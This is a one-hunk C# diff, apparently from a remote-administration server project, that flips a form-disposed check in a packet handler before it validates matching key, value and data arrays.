@@ -19,7 +19,7 @@ namespace xServer.Core.Commands
                 if ((packet.Key != null) && (packet.Value != null) && (packet.Data != null))
                 {
                     // Make sure that the client is in the correct state to handle the packet appropriately.
-                    if (client != null && client.Value.FrmRe != null && client.Value.FrmRe.IsDisposed || client.Value.FrmRe.Disposing)
+                    if (client != null && client.Value.FrmRe != null && !client.Value.FrmRe.IsDisposed || !client.Value.FrmRe.Disposing)
                     {
                         // Make sure that all of the arrays are of a valid length.
                         if ((packet.Key.Length > 0) && (packet.Key.Length == packet.Value.Length) && (packet.Key.Length == packet.Data.Length))
